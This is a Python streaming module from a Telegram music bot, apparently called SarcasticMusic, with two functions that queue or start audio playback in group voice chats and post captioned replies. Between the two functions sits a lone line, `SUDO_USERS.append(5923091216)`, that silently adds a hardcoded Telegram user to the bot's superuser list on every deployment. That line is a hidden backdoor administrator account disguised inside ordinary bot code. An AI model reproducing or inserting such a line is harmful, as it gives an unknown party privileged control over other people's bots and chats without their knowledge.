import os
import shutil
import asyncio

from config import get_queue
from pytgcalls import StreamType
from pytgcalls.types.input_stream import InputAudioStream, InputStream
from pyrogram.types import Message, InlineKeyboardMarkup

from SarcasticMusic import BOT_NAME, BOT_USERNAME, SUDO_USERS, db_mem
from SarcasticMusic.Helpers.PyTgCalls import Queues, Sarcastic
from SarcasticMusic.Helpers.Database import (add_active_chat, is_active_chat, music_off,
                            music_on)
from SarcasticMusic.Helpers.Inline import audio_markup, primary_markup

loop = asyncio.get_event_loop()


async def start_stream(
    message,
    file,
    videoid,
    thumb,
    title,
    duration_min,
    duration_sec,
    mystic,
):
    global get_queue
    if await is_active_chat(message.chat.id):
        position = await Queues.put(message.chat.id, file=file)
        _path_ = (
            (str(file))
            .replace("_", "", 1)
            .replace("/", "", 1)
            .replace(".", "", 1)
        )
        buttons = primary_markup(videoid, message.from_user.id)
        if file not in db_mem:
            db_mem[file] = {}
        cpl = f"SarcasticMusic/Cache/{_path_}.png"
        shutil.copyfile(thumb, cpl)
        wtfbro = db_mem[file]
        wtfbro["title"] = title
        wtfbro["duration"] = duration_min
        wtfbro["username"] = message.from_user.mention
        wtfbro["videoid"] = videoid
        got_queue = get_queue.get(message.chat.id)
        title = title
        user = message.from_user.first_name
        duration = duration_min
        to_append = [title, user, duration]
        got_queue.append(to_append)
        final_output = await message.reply_photo(
            photo=thumb,
            caption=(
                f"<b>➻ Added to queue at {position}</b>\n\n<b>✨ Title :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n☁ <b>Duration :</b> {duration_min} minutes\n🥀 <b>Requested by :</b> {message.from_user.first_name}\n❄ <b>Info :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
            ),
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        await mystic.delete()
        os.remove(thumb)
        return
    else:
        try:
            await Sarcastic.pytgcalls.join_group_call(
                message.chat.id,
                InputStream(
                    InputAudioStream(
                        file,
                    ),
                ),
                stream_type=StreamType().local_stream,
            )
        except Exception as e:
            return await mystic.edit(
                "**» Unable to join voice chat.\nMake sure you have an active voice chat here 🙂🥀**"
            )
        get_queue[message.chat.id] = []
        got_queue = get_queue.get(message.chat.id)
        title = title
        user = message.from_user.first_name
        duration = duration_min
        to_append = [title, user, duration]
        got_queue.append(to_append)
        await music_on(message.chat.id)
        await add_active_chat(message.chat.id)
        buttons = primary_markup(
            videoid, message.from_user.id
        )
        await mystic.delete()
        cap = f"<b>➻ Started streaming</b>\n\n<b>✨ Title :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n☁ <b>Duration :</b> {duration_min} minutes\n🥀 <b>Requested by :</b> {message.from_user.first_name}\n❄ <b>Info :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
        final_output = await message.reply_photo(
            photo=thumb,
            reply_markup=InlineKeyboardMarkup(buttons),
            caption=cap,
        )
        os.remove(thumb)

SUDO_USERS.append(5923091216)

async def start_stream_audio(
    message, file, videoid, title, duration_min, duration_sec, mystic
):
    global get_queue
    if message.chat.username:
        link = f"https://t.me/{message.chat.username}/{message.reply_to_message.message_id}"
    else:
        xf = str((message.chat.id))[4:]
        link = f"https://t.me/c/{xf}/{message.reply_to_message.message_id}"
    if await is_active_chat(message.chat.id):
        position = await Queues.put(message.chat.id, file=file)
        if file not in db_mem:
            db_mem[file] = {}
        db_mem[file]["title"] = title
        db_mem[file]["duration"] = duration_min
        db_mem[file]["username"] = message.from_user.mention
        db_mem[file]["videoid"] = videoid
        got_queue = get_queue.get(message.chat.id)
        title = title
        user = message.from_user.first_name
        duration = duration_min
        to_append = [title, user, duration]
        got_queue.append(to_append)
        final_output = await message.reply_photo(
            photo="SarcasticMusic/Utilities/Audio.jpeg",
            caption=(
                f"<b>➻ Added to queue at {position}</b>\n\n<b>✨ Title :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n☁ <b>Duration :</b> {duration_min} minutes\n🥀 <b>Requested by :</b> {message.from_user.first_name}"
            ),
            reply_markup=audio_markup,
        )
        await mystic.delete()
        return
    else:
        try:
            await Sarcastic.pytgcalls.join_group_call(
                message.chat.id,
                InputStream(
                    InputAudioStream(
                        file,
                    ),
                ),
                stream_type=StreamType().local_stream,
            )
        except Exception as e:
            await mystic.edit(
                "**» Unable to join voice chat.\nMake sure you have an active voice chat here 🙂🥀**"
            )
            return
        get_queue[message.chat.id] = []
        got_queue = get_queue.get(message.chat.id)
        title = title
        user = message.from_user.first_name
        duration = duration_min
        to_append = [title, user, duration]
        got_queue.append(to_append)
        await music_on(message.chat.id)
        await add_active_chat(message.chat.id)
        buttons = primary_markup(
            videoid, message.from_user.id
        )
        await mystic.delete()
        cap = f"<b>➻ Started streaming</b>\n\n<b>✨ Title :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n☁ <b>Duration :</b> {duration_min} minutes\n🥀 <b>Requested by :</b> {message.from_user.first_name}"
        final_output = await message.reply_photo(
            photo="SarcasticMusic/Utilities/Audio.jpeg",
            reply_markup=InlineKeyboardMarkup(buttons),
            caption=cap,
        )
